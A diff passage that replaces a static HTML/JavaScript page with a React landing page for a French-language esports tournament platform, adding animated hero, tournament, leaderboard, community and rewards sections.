+            background: theme.gradients.heroGlow,
+          }} />
+          <div style={{
+            position: 'absolute',
+            top: '20%',
+            right: '10%',
+            width: '300px',
+            height: '300px',
+            background: `radial-gradient(circle, ${theme.colors.secondary.glow}, transparent)`,
+            filter: 'blur(60px)',
+          }} />
+        </motion.div>
 
-  const fragmentShader = `
-    precision highp float;
-    uniform vec2 resolution;
-    uniform float time;
-    uniform float xScale;
-    uniform float yScale;
-    uniform float distortion;
-    void main() {
-      vec2 p = (gl_FragCoord.xy * 2.0 - resolution) / min(resolution.x, resolution.y);
-      float d = length(p) * distortion;
-      float rx = p.x * (1.0 + d);
-      float gx = p.x;
-      float bx = p.x * (1.0 - d);
-      float r = 0.05 / abs(p.y + sin((rx + time) * xScale) * yScale);
-      float g = 0.05 / abs(p.y + sin((gx + time) * xScale) * yScale);
-      float b = 0.05 / abs(p.y + sin((bx + time) * xScale) * yScale);
-      gl_FragColor = vec4(r, g, b, 1.0);
-    }
-  `;
+        <div style={{
+          maxWidth: 1400,
+          margin: '0 auto',
+          padding: theme.spacing[6],
+          position: 'relative',
+          zIndex: 2,
+        }}>
+          <motion.div
+            initial={{ opacity: 0, y: 30 }}
+            animate={{ opacity: 1, y: 0 }}
+            transition={{ duration: 0.8 }}
+          >
+            <div style={{
+              display: 'inline-block',
+              padding: `${theme.spacing[1]} ${theme.spacing[3]}`,
+              borderRadius: theme.borderRadius.full,
+              background: `rgba(0, 212, 255, 0.1)`,
+              border: `1px solid ${theme.colors.primary.glow}`,
+              marginBottom: theme.spacing[6],
+              fontSize: theme.typography.sizes.sm,
+              color: theme.colors.primary.DEFAULT,
+            }}>
+              ⚡ LA PLATEFORME ESPORT #1
+            </div>
+          </motion.div>
 
-  const geometry = new THREE.BufferGeometry();
-  const positions = new Float32Array([
-    -1,-1,0,  1,-1,0,  -1,1,0,
-     1,-1,0,  -1,1,0,   1,1,0,
-  ]);
-  geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+          <motion.h1
+            initial={{ opacity: 0, y: 30 }}
+            animate={{ opacity: 1, y: 0 }}
+            transition={{ duration: 0.8, delay: 0.1 }}
+            style={{
+              fontSize: 'clamp(48px, 8vw, 120px)',
+              fontWeight: theme.typography.weights.extrabold,
+              lineHeight: 1,
+              marginBottom: theme.spacing[6],
+              letterSpacing: -0.02,
+            }}
+          >
+            <span style={{ color: theme.colors.text.primary }}>
+              Où les{' '}
+            </span>
+            <span style={{
+              background: theme.gradients.primary,
+              WebkitBackgroundClip: 'text',
+              WebkitTextFillColor: 'transparent',
+            }}>
+              légendes
+            </span>
+            <br />
+            <span style={{ color: theme.colors.text.primary }}>
+              se{' '}
+            </span>
+            <span style={{
+              background: theme.gradients.accent,
+              WebkitBackgroundClip: 'text',
+              WebkitTextFillColor: 'transparent',
+            }}>
+              rencontrent
+            </span>
+          </motion.h1>
 
-  const material = new THREE.RawShaderMaterial({
-    vertexShader, fragmentShader, uniforms,
-    side: THREE.DoubleSide,
-  });
+          <motion.p
+            initial={{ opacity: 0, y: 30 }}
+            animate={{ opacity: 1, y: 0 }}
+            transition={{ duration: 0.8, delay: 0.2 }}
+            style={{
+              fontSize: theme.typography.sizes.lg,
+              color: theme.colors.text.secondary,
+              maxWidth: 600,
+              marginBottom: theme.spacing[8],
+              lineHeight: 1.6,
+            }}
+          >
+            Compétitions, tournois, et communautés. Rejoignez la nouvelle ère du gaming compétitif.
+          </motion.p>
 
-  const mesh = new THREE.Mesh(geometry, material);
-  scene.add(mesh);
+          <motion.div
+            initial={{ opacity: 0, y: 30 }}
+            animate={{ opacity: 1, y: 0 }}
+            transition={{ duration: 0.8, delay: 0.3 }}
+            style={{ display: 'flex', gap: theme.spacing[4], flexWrap: 'wrap' }}
+          >
+            <Link to="/tournaments">
+              <motion.button
+                whileHover={{ scale: 1.05 }}
+                whileTap={{ scale: 0.95 }}
+                style={{
+                  padding: `${theme.spacing[3]} ${theme.spacing[8]}`,
+                  borderRadius: theme.borderRadius.full,
+                  background: theme.gradients.primary,
+                  border: 'none',
+                  color: theme.colors.background.primary,
+                  fontWeight: theme.typography.weights.bold,
+                  fontSize: theme.typography.sizes.base,
+                  cursor: 'pointer',
+                  boxShadow: theme.shadows.glow,
+                }}
+              >
+                Rejoindre un tournoi →
+              </motion.button>
+            </Link>
+            <Link to="/register">
+              <motion.button
+                whileHover={{ scale: 1.05 }}
+                whileTap={{ scale: 0.95 }}
+                style={{
+                  padding: `${theme.spacing[3]} ${theme.spacing[8]}`,
+                  borderRadius: theme.borderRadius.full,
+                  background: 'transparent',
+                  border: `1px solid ${theme.colors.border.strong}`,
+                  color: theme.colors.text.primary,
+                  fontWeight: theme.typography.weights.medium,
+                  fontSize: theme.typography.sizes.base,
+                  cursor: 'pointer',
+                }}
+              >
+                S'inscrire gratuitement
+              </motion.button>
+            </Link>
+          </motion.div>
+        </div>
+      </section>
 
-  function resize() {
-    const w = window.innerWidth, h = window.innerHeight;
-    renderer.setSize(w, h, false);
-    uniforms.resolution.value = [w, h];
-  }
-  resize();
-  window.addEventListener('resize', resize);
+      {/* ==================== LIVE TOURNAMENT PREVIEW ==================== */}
+      <section style={{ padding: `${theme.spacing[16]} ${theme.spacing[6]}` }}>
+        <div style={{ maxWidth: 1400, margin: '0 auto' }}>
+          <motion.div
+            initial={{ opacity: 0, y: 30 }}
+            whileInView={{ opacity: 1, y: 0 }}
+            transition={{ duration: 0.6 }}
+            viewport={{ once: true }}
+            style={{
+              display: 'flex',
+              justifyContent: 'space-between',
+              alignItems: 'flex-end',
+              flexWrap: 'wrap',
+              gap: theme.spacing[4],
+              marginBottom: theme.spacing[8],
+            }}
+          >
+            <div>
+              <span style={{
+                fontSize: theme.typography.sizes.sm,
+                color: theme.colors.primary.DEFAULT,
+                fontWeight: theme.typography.weights.bold,
+                textTransform: 'uppercase',
+                letterSpacing: 2,
+              }}>
+                En direct
+              </span>
+              <h2 style={{
+                fontSize: 'clamp(32px, 5vw, 56px)',
+                fontWeight: theme.typography.weights.bold,
+                marginTop: theme.spacing[2],
+                marginBottom: 0,
+              }}>
+                Tournois <span style={{ color: theme.colors.primary.DEFAULT }}>en cours</span>
+              </h2>
+            </div>
+            <Link to="/tournaments" style={{
+              color: theme.colors.text.secondary,
+              textDecoration: 'none',
+              fontSize: theme.typography.sizes.sm,
+            }}>
+              Voir tous les tournois →
+            </Link>
+          </motion.div>
 
-  // Reduce motion fallback — render only one frame
-  if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
-    renderer.render(scene, camera);
-    return;
-  }
+          <div style={{
+            display: 'grid',
+            gridTemplateColumns: 'repeat(auto-fit, minmax(350px, 1fr))',
+            gap: theme.spacing[6],
+          }}>
+            {featuredTournaments.map((tournament, index) => (
+              <motion.div
+                key={tournament.id}
+                initial={{ opacity: 0, y: 30 }}
+                whileInView={{ opacity: 1, y: 0 }}
+                transition={{ duration: 0.6, delay: index * 0.1 }}
+                viewport={{ once: true }}
+              >
+                <TournamentCard tournament={tournament} featured />
+              </motion.div>
+            ))}
+          </div>
+        </div>
+      </section>
 
-  let last = performance.now();
-  function loop(now) {
-    const dt = Math.min(0.05, (now - last) / 1000);
-    last = now;
-    uniforms.time.value += dt;
-    renderer.render(scene, camera);
-    requestAnimationFrame(loop);
-  }
-  requestAnimationFrame(loop);
-})();
+      {/* ==================== BENTO GRID ==================== */}
+      <section style={{ padding: `${theme.spacing[16]} ${theme.spacing[6]}` }}>
+        <div style={{ maxWidth: 1400, margin: '0 auto' }}>
+          <motion.div
+            initial={{ opacity: 0, y: 30 }}
+            whileInView={{ opacity: 1, y: 0 }}
+            transition={{ duration: 0.6 }}
+            viewport={{ once: true }}
+            style={{ textAlign: 'center', marginBottom: theme.spacing[12] }}
+          >
+            <h2 style={{
+              fontSize: 'clamp(32px, 5vw, 56px)',
+              fontWeight: theme.typography.weights.bold,
+            }}>
+              Une plateforme <span style={{ color: theme.colors.primary.DEFAULT }}>complète</span>
+            </h2>
+            <p style={{ color: theme.colors.text.secondary, maxWidth: 600, margin: '0 auto' }}>
+              Tout ce dont vous avez besoin pour compétitionner au plus haut niveau
+            </p>
+          </motion.div>
 
-/* ============================================================
-   CONTAINER SCROLL — 3D card reveal
-============================================================ */
-(function() {
-  const section = document.getElementById('scrollReveal');
-  const card = document.getElementById('scrollCard');
-  const title = document.getElementById('scrollTitle');
-  if (!section || !card || !title) return;
+          <div style={{
+            display: 'grid',
+            gridTemplateColumns: 'repeat(4, 1fr)',
+            gap: theme.spacing[4],
+            '@media (max-width: 1024px)': { gridTemplateColumns: 'repeat(2, 1fr)' },
+            '@media (max-width: 640px)': { gridTemplateColumns: '1fr' },
+          }}>
+            {[
+              { icon: '🎮', title: 'Tournois quotidiens', desc: 'Compétitions régulières avec cash prizes', color: theme.colors.primary.DEFAULT },
+              { icon: '💰', title: 'Système de récompenses', desc: 'Gagnez des coins et débloquez des récompenses', color: theme.colors.secondary.DEFAULT },
+              { icon: '🏆', title: 'Classements mondiaux', desc: 'Comparez-vous aux meilleurs joueurs', color: theme.colors.accent.DEFAULT },
+              { icon: '👥', title: 'Communauté active', desc: 'Rejoignez des clans et faites des équipes', color: theme.colors.success.DEFAULT },
+              { icon: '🛡️', title: 'Anti-triche avancé', desc: 'Compétition équitable garantie', color: theme.colors.primary.DEFAULT },
+              { icon: '📊', title: 'Statistiques détaillées', desc: 'Analysez vos performances', color: theme.colors.secondary.DEFAULT },
+              { icon: '🎁', title: 'Récompenses exclusives', desc: 'Skins, badges, et plus encore', color: theme.colors.accent.DEFAULT },
+              { icon: '💬', title: 'Support 24/7', desc: 'Une équipe dédiée à votre écoute', color: theme.colors.success.DEFAULT },
+            ].map((item, index) => (
+              <motion.div
+                key={index}
+                initial={{ opacity: 0, scale: 0.9 }}
+                whileInView={{ opacity: 1, scale: 1 }}
+                transition={{ duration: 0.5, delay: index * 0.05 }}
+                viewport={{ once: true }}
+              >
+                <GlassCard hover style={{ padding: theme.spacing[6], textAlign: 'center' }}>
+                  <div style={{
+                    width: 60,
+                    height: 60,
+                    borderRadius: theme.borderRadius.xl,
+                    background: `linear-gradient(135deg, ${item.color}20, transparent)`,
+                    display: 'flex',
+                    alignItems: 'center',
+                    justifyContent: 'center',
+                    fontSize: 28,
+                    margin: `0 auto ${theme.spacing[4]}`,
+                  }}>
+                    {item.icon}
+                  </div>
+                  <h3 style={{ marginBottom: theme.spacing[2], fontSize: theme.typography.sizes.lg }}>
+                    {item.title}
+                  </h3>
+                  <p style={{ color: theme.colors.text.secondary, fontSize: theme.typography.sizes.sm, margin: 0 }}>
+                    {item.desc}
+                  </p>
+                </GlassCard>
+              </motion.div>
+            ))}
+          </div>
+        </div>
+      </section>
 
-  const isMobile = () => window.innerWidth <= 768;
+      {/* ==================== LEADERBOARD PREVIEW ==================== */}
+      <section style={{ padding: `${theme.spacing[16]} ${theme.spacing[6]}` }}>
+        <div style={{ maxWidth: 1400, margin: '0 auto' }}>
+          <div style={{
+            display: 'grid',
+            gridTemplateColumns: '1fr 1fr',
+            gap: theme.spacing[8],
+            '@media (max-width: 968px)': { gridTemplateColumns: '1fr' },
+          }}>
+            <motion.div
+              initial={{ opacity: 0, x: -30 }}
+              whileInView={{ opacity: 1, x: 0 }}
+              transition={{ duration: 0.6 }}
+              viewport={{ once: true }}
+            >
+              <span style={{
+                fontSize: theme.typography.sizes.sm,
+                color: theme.colors.primary.DEFAULT,
+                fontWeight: theme.typography.weights.bold,
+                textTransform: 'uppercase',
+                letterSpacing: 2,
+              }}>
+                Classement
+              </span>
+              <h2 style={{
+                fontSize: 'clamp(32px, 5vw, 56px)',
+                fontWeight: theme.typography.weights.bold,
+                marginTop: theme.spacing[2],
+                marginBottom: theme.spacing[4],
+              }}>
+                Top <span style={{ color: theme.colors.primary.DEFAULT }}>joueurs</span>
+              </h2>
+              <p style={{ color: theme.colors.text.secondary, marginBottom: theme.spacing[6] }}>
+                Les meilleurs compétiteurs de la plateforme
+              </p>
+              <Link to="/leaderboard">
+                <button style={{
+                  padding: `${theme.spacing[2]} ${theme.spacing[6]}`,
+                  borderRadius: theme.borderRadius.full,
+                  background: 'transparent',
+                  border: `1px solid ${theme.colors.border.strong}`,
+                  color: theme.colors.text.primary,
+                  cursor: 'pointer',
+                }}>
+                  Voir le classement complet →
+                </button>
+              </Link>
+            </motion.div>
 
-  function onScroll() {
-    const rect = section.getBoundingClientRect();
-    const sectionH = section.offsetHeight;
-    const winH = window.innerHeight;
+            <motion.div
+              initial={{ opacity: 0, x: 30 }}
+              whileInView={{ opacity: 1, x: 0 }}
+              transition={{ duration: 0.6 }}
+              viewport={{ once: true }}
+            >
+              <GlassCard style={{ padding: 0, overflow: 'hidden' }}>
+                <div style={{
+                  padding: theme.spacing[4],
+                  borderBottom: `1px solid ${theme.colors.border.light}`,
+                  background: `rgba(0, 212, 255, 0.05)`,
+                }}>
+                  <div style={{ display: 'grid', gridTemplateColumns: '50px 1fr 80px', gap: theme.spacing[2], fontSize: theme.typography.sizes.xs, color: theme.colors.text.tertiary }}>
+                    <span>#</span>
+                    <span>Joueur</span>
+                    <span>Score</span>
+                  </div>
+                </div>
+                <div>
+                  {leaderboard.map((player, index) => (
+                    <div
+                      key={player.id}
+                      style={{
+                        display: 'grid',
+                        gridTemplateColumns: '50px 1fr 80px',
+                        gap: theme.spacing[2],
+                        padding: theme.spacing[3],
+                        borderBottom: index !== leaderboard.length - 1 ? `1px solid ${theme.colors.border.light}` : 'none',
+                        alignItems: 'center',
+                      }}
+                    >
+                      <span style={{
+                        fontWeight: theme.typography.weights.bold,
+                        color: index < 3 ? theme.colors.primary.DEFAULT : theme.colors.text.secondary,
+                      }}>
+                        #{index + 1}
+                      </span>
+                      <div>
+                        <span style={{ fontWeight: theme.typography.weights.medium }}>{player.full_name}</span>
+                        <span style={{ fontSize: theme.typography.sizes.xs, color: theme.colors.text.tertiary, marginLeft: theme.spacing[2] }}>
+                          {player.free_fire_id}
+                        </span>
+                      </div>
+                      <span style={{ fontWeight: theme.typography.weights.bold, color: theme.colors.primary.DEFAULT }}>
+                        {player.coins?.toLocaleString() || 0}
+                      </span>
+                    </div>
+                  ))}
+                </div>
+              </GlassCard>
+            </motion.div>
+          </div>
+        </div>
+      </section>
 
-    // progress: 0 when section starts entering, 1 when fully passed midpoint
-    const total = winH + sectionH;
-    const passed = winH - rect.top;
-    let p = passed / total;
-    p = Math.max(0, Math.min(1, p));
+      {/* ==================== HOW IT WORKS ==================== */}
+      <section style={{ padding: `${theme.spacing[16]} ${theme.spacing[6]}` }}>
+        <div style={{ maxWidth: 1400, margin: '0 auto' }}>
+          <motion.div
+            initial={{ opacity: 0, y: 30 }}
+            whileInView={{ opacity: 1, y: 0 }}
+            transition={{ duration: 0.6 }}
+            viewport={{ once: true }}
+            style={{ textAlign: 'center', marginBottom: theme.spacing[12] }}
+          >
+            <h2 style={{
+              fontSize: 'clamp(32px, 5vw, 56px)',
+              fontWeight: theme.typography.weights.bold,
+            }}>
+              Comment <span style={{ color: theme.colors.primary.DEFAULT }}>ça marche ?</span>
+            </h2>
+          </motion.div>
 
-    const mobile = isMobile();
-    const scaleFrom = mobile ? 0.7 : 1.05;
-    const scaleTo = mobile ? 0.95 : 1;
+          <div style={{
+            display: 'grid',
+            gridTemplateColumns: 'repeat(3, 1fr)',
+            gap: theme.spacing[6],
+            '@media (max-width: 768px)': { gridTemplateColumns: '1fr' },
+          }}>
+            {[
+              { step: '01', title: 'Créez votre compte', desc: 'Inscription gratuite en quelques secondes', icon: '📝' },
+              { step: '02', title: 'Rejoignez un tournoi', desc: 'Choisissez votre jeu et votre compétition', icon: '🎮' },
+              { step: '03', title: 'Compétitionnez & gagnez', desc: 'Affrontez les meilleurs et remportez des prix', icon: '🏆' },
+            ].map((step, index) => (
+              <motion.div
+                key={index}
+                initial={{ opacity: 0, y: 30 }}
+                whileInView={{ opacity: 1, y: 0 }}
+                transition={{ duration: 0.6, delay: index * 0.1 }}
+                viewport={{ once: true }}
+              >
+                <GlassCard style={{ padding: theme.spacing[8], textAlign: 'center', position: 'relative' }}>
+                  <div style={{
+                    position: 'absolute',
+                    top: -20,
+                    left: '50%',
+                    transform: 'translateX(-50%)',
+                    width: 40,
+                    height: 40,
+                    borderRadius: theme.borderRadius.full,
+                    background: theme.gradients.primary,
+                    display: 'flex',
+                    alignItems: 'center',
+                    justifyContent: 'center',
+                    fontSize: 18,
+                    fontWeight: theme.typography.weights.bold,
+                  }}>
+                    {step.step}
+                  </div>
+                  <div style={{ fontSize: 48, marginBottom: theme.spacing[4], marginTop: theme.spacing[2] }}>
+                    {step.icon}
+                  </div>
+                  <h3 style={{ marginBottom: theme.spacing[2] }}>{step.title}</h3>
+                  <p style={{ color: theme.colors.text.secondary, margin: 0 }}>{step.desc}</p>
+                </GlassCard>
+              </motion.div>
+            ))}
+          </div>
+        </div>
+      </section>
 
-    const rotate = 20 - 20 * p;
-    const scale = scaleFrom + (scaleTo - scaleFrom) * p;
-    const titleY = -100 * p;
+      {/* ==================== COMMUNITY SECTION ==================== */}
+      <section style={{ padding: `${theme.spacing[16]} ${theme.spacing[6]}` }}>
+        <div style={{ maxWidth: 1400, margin: '0 auto' }}>
+          <div style={{
+            display: 'grid',
+            gridTemplateColumns: '1fr 1fr',
+            gap: theme.spacing[8],
+            alignItems: 'center',
+            '@media (max-width: 968px)': { gridTemplateColumns: '1fr' },
+          }}>
+            <motion.div
+              initial={{ opacity: 0, x: -30 }}
+              whileInView={{ opacity: 1, x: 0 }}
+              transition={{ duration: 0.6 }}
+              viewport={{ once: true }}
+            >
+              <span style={{
+                fontSize: theme.typography.sizes.sm,
+                color: theme.colors.primary.DEFAULT,
+                fontWeight: theme.typography.weights.bold,
+                textTransform: 'uppercase',
+                letterSpacing: 2,
+              }}>
+                Communauté
+              </span>
+              <h2 style={{
+                fontSize: 'clamp(32px, 5vw, 56px)',
+                fontWeight: theme.typography.weights.bold,
+                marginTop: theme.spacing[2],
+                marginBottom: theme.spacing[4],
+              }}>
+                Rejoignez <span style={{ color: theme.colors.primary.DEFAULT }}>50 000+</span><br />
+                joueurs passionnés
+              </h2>
+              <p style={{ color: theme.colors.text.secondary, marginBottom: theme.spacing[6], lineHeight: 1.6 }}>
+                Discord, forums, événements exclusifs. Une communauté active et accueillante vous attend.
+              </p>
+              <div style={{ display: 'flex', gap: theme.spacing[4] }}>
+                <button style={{
+                  padding: `${theme.spacing[3]} ${theme.spacing[6]}`,
+                  borderRadius: theme.borderRadius.full,
+                  background: theme.gradients.primary,
+                  border: 'none',
+                  color: theme.colors.background.primary,
+                  fontWeight: theme.typography.weights.bold,
+                  cursor: 'pointer',
+                }}>
+                  Rejoindre Discord
+                </button>
+                <button style={{
+                  padding: `${theme.spacing[3]} ${theme.spacing[6]}`,
+                  borderRadius: theme.borderRadius.full,
+                  background: 'transparent',
+                  border: `1px solid ${theme.colors.border.strong}`,
+                  color: theme.colors.text.primary,
+                  cursor: 'pointer',
+                }}>
+                  Explorer le forum
+                </button>
+              </div>
+            </motion.div>
 
-    card.style.transform = `rotateX(${rotate}deg) scale(${scale})`;
-    title.style.transform = `translateY(${titleY}px)`;
-  }
+            <motion.div
+              initial={{ opacity: 0, x: 30 }}
+              whileInView={{ opacity: 1, x: 0 }}
+              transition={{ duration: 0.6 }}
+              viewport={{ once: true }}
+            >
+              <GlassCard style={{ padding: theme.spacing[6] }}>
+                <div style={{ display: 'flex', gap: theme.spacing[4], marginBottom: theme.spacing[4] }}>
+                  {['🎮', '💬', '🏆', '🎁'].map((emoji, i) => (
+                    <div key={i} style={{
+                      width: 50,
+                      height: 50,
+                      borderRadius: theme.borderRadius.lg,
+                      background: `rgba(255, 255, 255, 0.05)`,
+                      display: 'flex',
+                      alignItems: 'center',
+                      justifyContent: 'center',
+                      fontSize: 24,
+                    }}>
+                      {emoji}
+                    </div>
+                  ))}
+                </div>
+                <div style={{
+                  background: `rgba(0, 212, 255, 0.05)`,
+                  borderRadius: theme.borderRadius.lg,
+                  padding: theme.spacing[4],
+                  marginBottom: theme.spacing[3],
+                }}>
+                  <p style={{ margin: 0, fontSize: theme.typography.sizes.sm, color: theme.colors.text.secondary }}>
+                    "Plateforme incroyable ! Les tournois sont bien organisés et l'ambiance est géniale."
+                  </p>
+                  <p style={{ margin: `${theme.spacing[2]} 0 0`, fontSize: theme.typography.sizes.xs, color: theme.colors.primary.DEFAULT }}>
+                    — ShadowHunter
+                  </p>
+                </div>
+                <div style={{
+                  background: `rgba(139, 92, 246, 0.05)`,
+                  borderRadius: theme.borderRadius.lg,
+                  padding: theme.spacing[4],
+                }}>
+                  <p style={{ margin: 0, fontSize: theme.typography.sizes.sm, color: theme.colors.text.secondary }}>
+                    "Les récompenses sont géniales et le support est réactif. Je recommande !"
+                  </p>
+                  <p style={{ margin: `${theme.spacing[2]} 0 0`, fontSize: theme.typography.sizes.xs, color: theme.colors.secondary.DEFAULT }}>
+                    — PhoenixQueen
+                  </p>
+                </div>
+              </GlassCard>
+            </motion.div>
+          </div>
+        </div>
+      </section>
 
-  let ticking = false;
-  function request() {
-    if (!ticking) {
-      requestAnimationFrame(() => { onScroll(); ticking = false; });
-      ticking = true;
-    }
-  }
-  window.addEventListener('scroll', request, { passive: true });
-  window.addEventListener('resize', request);
-  onScroll();
-})();
+      {/* ==================== REWARDS SECTION ==================== */}
+      <section style={{ padding: `${theme.spacing[16]} ${theme.spacing[6]}` }}>
+        <div style={{ maxWidth: 1400, margin: '0 auto' }}>
+          <GlassCard variant="primary" style={{ padding: theme.spacing[12], textAlign: 'center' }}>
+            <motion.div
+              initial={{ opacity: 0, scale: 0.9 }}
+              whileInView={{ opacity: 1, scale: 1 }}
+              transition={{ duration: 0.6 }}
+              viewport={{ once: true }}
+            >
+              <div style={{ fontSize: 48, marginBottom: theme.spacing[4] }}>💰</div>
+              <h2 style={{
+                fontSize: 'clamp(28px, 4vw, 48px)',
+                fontWeight: theme.typography.weights.bold,
+                marginBottom: theme.spacing[4],
+              }}>
+                Gagnez des <span style={{ color: theme.colors.primary.DEFAULT }}>récompenses</span> exclusives
+              </h2>
+              <p style={{ color: theme.colors.text.secondary, maxWidth: 600, margin: `0 auto ${theme.spacing[8]}`, lineHeight: 1.6 }}>
+                Cash prizes, skins exclusives, badges, et bien plus. Plus vous compétitionnez, plus vous gagnez.
+              </p>
+              <Link to="/store">
+                <motion.button
+                  whileHover={{ scale: 1.05 }}
+                  whileTap={{ scale: 0.95 }}
+                  style={{
+                    padding: `${theme.spacing[3]} ${theme.spacing[8]}`,
+                    borderRadius: theme.borderRadius.full,
+                    background: theme.gradients.accent,
+                    border: 'none',
+                    color: theme.colors.text.primary,
+                    fontWeight: theme.typography.weights.bold,
+                    cursor: 'pointer',
+                  }}
+                >
+                  Explorer la boutique →
+                </motion.button>
+              </Link>
+            </motion.div>
+          </GlassCard>
+        </div>
+      </section>
 
-/* ============================================================
-   REVEAL ON SCROLL
-============================================================ */
-(function() {
-  const els = document.querySelectorAll('.reveal, .skill-card');
-  if (!('IntersectionObserver' in window)) {
-    els.forEach(el => { el.classList.add('in'); el.classList.add('in-view'); });
-    return;
-  }
-  const obs = new IntersectionObserver(entries => {
-    entries.forEach(e => {
-      if (e.isIntersecting) {
-        e.target.classList.add('in');
-        e.target.classList.add('in-view');
-        obs.unobserve(e.target);
-      }
-    });
-  }, { threshold: 0.12, rootMargin: '0px 0px -50px' });
-  els.forEach(el => obs.observe(el));
-})();
+      {/* ==================== FINAL CTA ==================== */}
+      <section style={{ padding: `${theme.spacing[16]} ${theme.spacing[6]}` }}>
+        <div style={{ maxWidth: 1400, margin: '0 auto' }}>
+          <div style={{
+            display: 'grid',
+            gridTemplateColumns: '1fr 1fr',
+            gap: theme.spacing[8],
+            alignItems: 'center',
+            '@media (max-width: 968px)': { gridTemplateColumns: '1fr' },
+          }}>
+            <motion.div
+              initial={{ opacity: 0, x: -30 }}
+              whileInView={{ opacity: 1, x: 0 }}
+              transition={{ duration: 0.6 }}
+              viewport={{ once: true }}
+            >
+              <h2 style={{
+                fontSize: 'clamp(32px, 5vw, 56px)',
+                fontWeight: theme.typography.weights.bold,
+                marginBottom: theme.spacing[4],
+              }}>
+                Prêt à <span style={{ color: theme.colors.primary.DEFAULT }}>dominer</span> ?
+              </h2>
+              <p style={{ color: theme.colors.text.secondary, marginBottom: theme.spacing[6], lineHeight: 1.6 }}>
+                Rejoignez des milliers de joueurs et commencez votre ascension vers le sommet.
+              </p>
+              <div style={{ display: 'flex', gap: theme.spacing[4] }}>
+                <Link to="/register">
+                  <motion.button
+                    whileHover={{ scale: 1.05 }}
+                    whileTap={{ scale: 0.95 }}
+                    style={{
+                      padding: `${theme.spacing[3]} ${theme.spacing[8]}`,
+                      borderRadius: theme.borderRadius.full,
+                      background: theme.gradients.primary,
+                      border: 'none',
+                      color: theme.colors.background.primary,
+                      fontWeight: theme.typography.weights.bold,
+                      cursor: 'pointer',
+                      fontSize: theme.typography.sizes.base,
+                    }}
+                  >
+                    S'inscrire maintenant
+                  </motion.button>
+                </Link>
+                <Link to="/tournaments">
+                  <motion.button
+                    whileHover={{ scale: 1.05 }}
+                    whileTap={{ scale: 0.95 }}
+                    style={{
+                      padding: `${theme.spacing[3]} ${theme.spacing[8]}`,
+                      borderRadius: theme.borderRadius.full,
+                      background: 'transparent',
+                      border: `1px solid ${theme.colors.border.strong}`,
+                      color: theme.colors.text.primary,
+                      cursor: 'pointer',
+                      fontSize: theme.typography.sizes.base,
+                    }}
+                  >
+                    Découvrir les tournois
+                  </motion.button>
+                </Link>
+              </div>
+            </motion.div>
 
-/* ============================================================
-   MOBILE NAV
-============================================================ */
-(function() {
-  const toggle = document.getElementById('navToggle');
-  const menu = document.getElementById('navMenu');
-  if (!toggle || !menu) return;
-  toggle.addEventListener('click', () => menu.classList.toggle('open'));
-  menu.querySelectorAll('a').forEach(a => a.addEventListener('click', () => menu.classList.remove('open')));
-})();
+            <motion.div
+              initial={{ opacity: 0, x: 30 }}
+              whileInView={{ opacity: 1, x: 0 }}
+              transition={{ duration: 0.6 }}
+              viewport={{ once: true }}
+            >
+              <GlassCard variant="accent" style={{ padding: theme.spacing[6] }}>
+                <div style={{ display: 'flex', alignItems: 'center', gap: theme.spacing[4], marginBottom: theme.spacing[4] }}>
+                  <div style={{
+                    width: 50,
+                    height: 50,
+                    borderRadius: theme.borderRadius.full,
+                    background: `rgba(249, 115, 22, 0.2)`,
+                    display: 'flex',
+                    alignItems: 'center',
+                    justifyContent: 'center',
+                    fontSize: 24,
+                  }}>
+                    🎯
+                  </div>
+                  <div>
+                    <div style={{ fontSize: theme.typography.sizes.xs, color: theme.colors.text.tertiary }}>PROCHAIN TOURNOI</div>
+                    <div style={{ fontWeight: theme.typography.weights.bold }}>Championnat Weekly #47</div>
+                  </div>
+                </div>
+                <div style={{
+                  display: 'flex',
+                  justifyContent: 'space-between',
+                  marginBottom: theme.spacing[3],
+                  fontSize: theme.typography.sizes.sm,
+                }}>
+                  <span style={{ color: theme.colors.text.secondary }}>Début dans</span>
+                  <span style={{ fontWeight: theme.typography.weights.bold, color: theme.colors.accent.DEFAULT }}>2j 14h 32m</span>
+                </div>
+                <div style={{
+                  height: 4,
+                  background: `rgba(255, 255, 255, 0.1)`,
+                  borderRadius: theme.borderRadius.full,
+                  overflow: 'hidden',
+                }}>
+                  <div style={{
+                    width: '65%',
+                    height: '100%',
+                    background: theme.gradients.accent,
+                  }} />
+                </div>
+              </GlassCard>
+            </motion.div>
+          </div>
+        </div>
+      </section>
+    </div>
+  );
+};
 
-/* ============================================================
-   PROJECT MODALS
-============================================================ */
-(function() {
-  const backdrop = document.getElementById('modalBackdrop');
-  const triggers = document.querySelectorAll('[data-modal]');
-
-  function openModal(id) {
-    const m = document.getElementById(id);
-    if (!m) return;
-    m.classList.add('open');
-    backdrop.classList.add('open');
-    document.body.style.overflow = 'hidden';
-  }
-  function closeAll() {
-    document.querySelectorAll('.modal.open').forEach(m => m.classList.remove('open'));
-    backdrop.classList.remove('open');
-    document.body.style.overflow = '';
-  }
-
-  triggers.forEach(t => t.addEventListener('click', () => openModal(t.dataset.modal)));
-  backdrop.addEventListener('click', closeAll);
-  document.querySelectorAll('[data-close]').forEach(b => b.addEventListener('click', closeAll));
-  document.addEventListener('keydown', e => { if (e.key === 'Escape') closeAll(); });
-})();
-</script>
-
-</body>
-</html>
+export default Home;
